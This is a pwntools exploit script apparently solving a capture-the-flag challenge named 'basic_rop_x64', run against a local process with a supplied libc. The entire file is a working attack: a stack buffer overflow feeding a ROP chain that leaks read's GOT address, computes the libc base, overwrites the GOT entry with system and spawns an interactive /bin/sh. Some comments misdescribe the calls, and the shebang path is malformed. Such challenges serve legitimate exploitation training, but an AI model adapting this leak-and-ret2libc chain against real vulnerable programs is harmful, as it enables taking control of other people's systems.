#!/bin/usr/python3

from pwn import *

p = process('./basic_rop_x64', env={"LD_PRELOAD":"./libc.so.6"})
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']

buf = b'A'*0x40 + b'B'*0x8

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
ret = 0x00000000004005a9

# write(1, read_got, 0)
payload = buf
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, 0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") = system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(ret)
payload += p64(read_plt)

print(hex(len(payload)))
p.send(payload)
p.recvuntil(b'A'*0x40)
read = u64(p.recvn(8))
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()